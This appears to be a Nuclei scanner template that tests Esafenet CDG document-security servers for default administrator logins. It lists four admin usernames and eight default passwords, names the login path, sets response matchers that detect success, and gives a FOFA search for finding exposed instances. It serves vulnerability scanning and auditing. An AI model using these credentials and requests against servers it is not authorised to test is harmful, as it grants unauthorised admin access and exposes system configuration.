http:
- attack: clusterbomb
  body: command=Login&help=null&verifyCodeDigit=dfd&name={{username}}&pass={{password}}
  headers:
    content-type: application/x-www-form-urlencoded
  matchers:
  - type: word
    words:
    - est.connection.url
  - part: body
    regex:
    - (127\.0\.0\.1)|(localhost)(192\.168|10\.|172\.(1[6-9]|2\d|3[01]))\.\d{1,3}\.\d{1,3}
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/CDGServer3/SystemConfig'
  payloads:
    password:
    - Est@Spc820
    - '12345678'
    - '123456'
    - Est@Spc2018
    - Est@Spc2019
    - Est@Spc2020
    - Est@Spc2021
    - Est@Spc2022
    username:
    - systemadmin
    - configadmin
    - secadmin
    - docadmin
id: esafenet-cdg-default-login
info:
  author: chesterblue
  classification:
    cpe: cpe:2.3:a:esafenet:cdg:*:*:*:*:*:*:*:*
  description: 'Esafenet electronic document security management system default  credentials
    were discovered.

    '
  metadata:
    fofa-query: esafenet
    max-request: 32
    product: cdg
    vendor: esafenet
    verified: true
  name: Esafenet CDG - Default Login
  severity: high
  tags: esafenet,cdg,default-login,vuln
